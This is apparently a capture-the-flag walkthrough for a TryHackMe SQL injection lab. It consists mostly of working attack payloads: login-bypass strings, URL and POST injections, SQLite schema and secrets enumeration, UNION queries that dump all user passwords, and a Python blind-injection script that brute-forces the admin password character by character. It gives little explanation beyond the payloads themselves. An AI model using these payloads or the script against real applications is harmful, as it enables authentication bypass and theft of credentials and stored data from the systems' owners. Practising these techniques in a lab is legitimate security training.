# SQL Injection Lab

**Room Link:** [https://tryhackme.com/room/sqlilab](https://tryhackme.com/room/sqlilab)



## Introduction to SQL Injection: Part 1

### SQL Injection 1: Input Box Non-String

```
1 or 1=1-- -
```

### **SQL Injection 2: Input Box String**

```
1' or '1'='1'-- -
```

### SQL Injection 3: URL Injection

```
$VICTIM:5000/sesqli3/login?profileID=1' or 1=1-- -&password=a
```

**SQL Injection 4: POST Injection**

```
POST /sesqli4/login HTTP/1.1
Host: 10.10.164.155:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://10.10.164.155:5000
Connection: close
Referer: http://10.10.164.155:5000/sesqli4/login
Cookie: session=.eJy90jFrYzEMB_Dv4jmDZUu2nPk46NLt5iLJMjyaNu17PUoJ-e7nXI-jQ4dM2SwJhH_--xQ2314PCzx0eZOwP4Vfdz_CHnbBn2Q5hH0Iu_AsTz5PP1d5tuOyXTqLPd5_dmf1Itv2clzf7tdZc4mUiCJgZPw3fD-ufY7QOI8aTUYWsCaGhrWnhuRxVB61Z5JqDVDYgaFkMU-ZBdS9gF62rcexHPxyxwBxNjY5yPoR9oniefcf83vz9WHpfyGfvXQLYC0aidFb0xoVW1UpyJkUnBw9RaCEVIs0kMo5C08rFNds2ebGa4HpG2C-BdBsoEGExuRZXWZydQpkFHVuOXJXm_Mxjbm7zgeY-WKx1HtDALsWmL8B4i2AvQnUwtgGWbFOM0TqQI3ZSKypKs_Pi105F-k8mDRy9QQ4BJpdnSB-AZ7_ABfzCOM.ZO_PVg.gxMIbBhBjlFSHtc1twhp3ImdLj4
Upgrade-Insecure-Requests: 1

profileID=-1%27%20or%201=1--%20-&password=a
```

## Introduction to SQL Injection: Part 2







Shows all the table names

```
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

Show all fields from the table usertable

```
l FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

Shows all the fields from the table secret

```
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
```

<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

Display all the values from the table secrets

```
',nickName=(SELECT group_concat(id || "," || author|| "," || secret|| ":") from secrets),email='
```

<figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

## Vulnerable Startup: Broken Authentication

```
1' or '1'='1'-- -
```

<figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

## Vulnerable Startup: Broken Authentication&#x20;

```
Username: ' OR 1=1-- -
```

<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

#### **decode\_cookie.py**

```
#!/usr/bin/python3
import zlib
import sys
import json
from itsdangerous import base64_decode


def decode(cookie):
    """
    Decode a Flask cookie

    https://www.kirsle.net/wizards/flask-session.cgi
    """
    try:
        compressed = False
        payload = cookie

        if payload.startswith('.'):
            compressed = True
            payload = payload[1:]

        data = payload.split(".")[0]

        data = base64_decode(data)
        if compressed:
            data = zlib.decompress(data)

        return data.decode("utf-8")
    except Exception as e:
        return f"[Decoding error: are you sure this was a Flask session cookie? {e}]"


cookie = sys.argv[1]
data = decode(cookie)
json_data = json.loads(data)
pretty = json.dumps(json_data, sort_keys=True, indent=4, separators=(",", ": "))
print(pretty)

```



<figure><img src="../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

```
python decode_cookie.py .eJyrVkrOSMzJSc1LTzWKLy1OLYrPTFGyMtRBF85LzE1VslJKTMnNzFOqBQAYpRNS.ZPCIPg.GEqyzNXd85i4M0Oqpt9ITOmwTOM
```

<figure><img src="../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>



```
' UNION SELECT 1,NULL-- -
```

<figure><img src="../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

```
' UNION SELECT 1,2-- - 
```

<figure><img src="../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

Enmerutate passwords, the below only returns the first result which we probably don't want.

```
' UNION SELECT 1, password from users-- -
```

<figure><img src="../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

This way concats all the passwords

```
' UNION SELECT 1,group_concat(password) FROM users-- -
```

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

## Vulnerable Startup: Broken Authentication 3 (Blind Injection)



#### challenge3-exploit.py

```
#!/usr/bin/python3
import sys
import requests
import string


def send_p(url, query):
    payload = {"username": query, "password": "admin"}
    try:
        r = requests.post(url, data=payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return r.text


def main(addr):
    url = f"http://{addr}/challenge3/login"
    flag = ""
    password_len = 38
    # Not the most efficient way of doing it...
    for i in range(1, password_len):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
            # Convert char to hex and remove "0x"
            h = hex(ord(c))[2:]
            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
                f"{i},1)=CAST(X'{h}' AS TEXT)--"

            resp = send_p(url, query)
            if not "Invalid" in resp:
                flag += c
                print(flag)
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    main(sys.argv[1])

```



**Kali**

```
python challenge3-exploit.py $KALI:5000
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (3).png" alt=""><figcaption></figcaption></figure>

## Vulnerable Startup: Vulnerable Notes

Create user

```
Username: '  union select 1,group_concat(password) from users'
Password: blah
```



<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (4).png" alt=""><figcaption></figcaption></figure>



## Vulnerable Startup: Change Password

**Signup**

```
Username: admin'-- -
```

## Vulnerable Startup: Book Title

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
') union select 1,group_concat(username),group_concat(password),4 from users-- -
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Vulnerable Startup: Book Title 2

```
' union select '-1''union select group_concat(username),group_concat(password),3,4 from users-- -
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>























